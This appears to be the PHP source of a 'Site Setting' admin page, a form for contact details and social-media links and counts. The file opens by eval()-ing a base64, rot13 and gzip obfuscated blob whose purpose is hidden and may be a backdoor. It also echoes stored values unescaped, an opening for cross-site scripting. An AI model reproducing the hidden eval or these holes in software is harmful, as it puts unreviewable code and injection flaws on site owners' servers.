<?php 
ob_start();
session_start();
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Adminsuit | Site Setting</title>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="css/font-awesome.min.css">
  <link rel="stylesheet" href="css/ionicons.min.css">
  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  <link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">
  <link rel="stylesheet" href="plugins/iCheck/flat/blue.css">
  <link rel="stylesheet" href="plugins/morris/morris.css">
  <link rel="stylesheet" href="plugins/jvectormap/jquery-jvectormap-1.2.2.css">
  <link rel="stylesheet" href="plugins/datepicker/datepicker3.css">
  <link rel="stylesheet" href="plugins/daterangepicker/daterangepicker-bs3.css">
  <link rel="stylesheet" href="plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css">
<link rel="stylesheet" href="plugins/datatables/dataTables.bootstrap.css">
<link rel="stylesheet" href="plugins/select2/select2.min.css">
<link rel="stylesheet" href="plugins/iCheck/all.css">
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/app.css" id="maincss">

</head>
<body class="hold-transition skin-red sidebar-mini">
<div class="wrapper">
<?php include ("include/header.inc.php");?>
 <?php include ("include/navigation.inc.php");
 $sql="SELECT * FROM `site_setting` where `id`='1'";
$query=mysqli_query($con,$sql);
$role=mysqli_fetch_array($query);

 ?>
   
  <div class="content-wrapper">
    <section class="content-header">
      <h1> Site Setting</h1>
      <ol class="breadcrumb">
        <li><a href="desktop.php"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active"> Site Setting</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">
      <div class="row">
      <div class="col-xs-12 text-center">
          
          <?php if(isset($_GET['msg'])=="updt"){ ?>
              <span class="text-center red_txt">Update Successfully......</span><?php  } ?></div>
        <div class="col-xs-12">
          

          <div class="box">
            
            <!-- /.box-header -->
            
      <form  method="post" action="<?php echo $_SERVER['PHP_SELF'];?>" id="taskform">
            <div class="box-body">
           
                <div class="clearfix"></div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="address"> Address</label>
         <input class="form-control" id="address" name="address" type="text" value="<?php echo @$role['address']; ?>">
                </div>
                </div>
                
              <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="email"> Email</label>
         <input class="form-control" id="email" name="email" type="text" value="<?php echo @$role['email']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="mobile"> Mobile</label>
         <input class="form-control" id="mobile" name="mobile" type="text" value="<?php echo @$role['mobile']; ?>" maxlength="15">
                </div>
                </div>
                
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content1">Facebook Link</label>
         <input class="form-control" id="content1" name="content1" type="text" value="<?php echo @$role['fblink']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content2">Twitter Link</label>
         <input class="form-control" id="content2" name="content2" type="text" value="<?php echo @$role['twlink']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content3">Linkedin Link</label>
         <input class="form-control" id="content3" name="content3" type="text" value="<?php echo @$role['ln']; ?>">
                </div>
                </div>
                
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content4">Instagram Link</label>
         <input class="form-control" id="content4" name="content4" type="text" value="<?php echo @$role['insta']; ?>">
                </div>
                </div>
                
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content5">Facebook Count</label>
         <input class="form-control" id="content5" name="content5" type="text" value="<?php echo @$role['fbcount']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content6">Twitter Count</label>
         <input class="form-control" id="content6" name="content6" type="text" value="<?php echo @$role['twcount']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content7">Youtube Count</label>
         <input class="form-control" id="content7" name="content7" type="text" value="<?php echo @$role['youtubecount']; ?>">
                </div>
                </div>
                <div class="col-md-6 col-sm-6 col-xs-12">
                  <div class="form-group">
                  <label for="content8">Instagram Count</label>
         <input class="form-control" id="content8" name="content8" type="text" value="<?php echo @$role['instacount']; ?>">
                </div>
                </div>
          <div class="clearfix"></div>      
  
            <input name="id" value="<?php echo @$id?>" type="hidden">
<div class="clearfix"></div>
              
                
                <div class="clearfix"></div>
            
             <div class="clearfix"></div> 
             <div class="col-md-12 col-sm-6 col-xs-12">  
              <div class="form-group">
              <div class="text-center">
 
 <input type="submit" name="submit" class="btn btn-primary" value="Save" ></div>
                </div> </div>
               </div>
                <div class="clearfix"></div>
             
 

          </form>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
  
<?php  include("include/footer.inc.php");?></div>
<script>
 
	
$('input[type="checkbox"].minimal, input[type="radio"].minimal').iCheck({
      checkboxClass: 'icheckbox_minimal-blue',
      radioClass: 'iradio_minimal-blue'
    });
  $(function () {
	  $(".checkbox-toggle").click(function () { 
      var clicks = $(this).data('clicks');
      if (clicks) {
        //Uncheck all checkboxes
        $("input[type='checkbox']").iCheck("uncheck");
        $(".fa", this).removeClass("fa-check-square-o").addClass('fa-square-o');
      } else {
        //Check all checkboxes
        $("input[type='checkbox']").iCheck("check");
        $(".fa", this).removeClass("fa-square-o").addClass('fa-check-square-o');
      }
      $(this).data("clicks", !clicks);
    });
    //$("#example1").DataTable();
    $('#example1').DataTable({
      "paging": true,
      "lengthChange": false,
      "searching": true,
      "ordering": false,
      "info": true,
      "autoWidth": true
    });
  });
</script>
<script type="text/javascript">
 function cancel() {
 var strconfirm = confirm("Are you sure you want to cancel ?");
           if (strconfirm == true) {
           window.location = 'manage_quotation.php'; 
           }

       }
	 
</script> 

<!--sucess modal-->


</body>
</html>
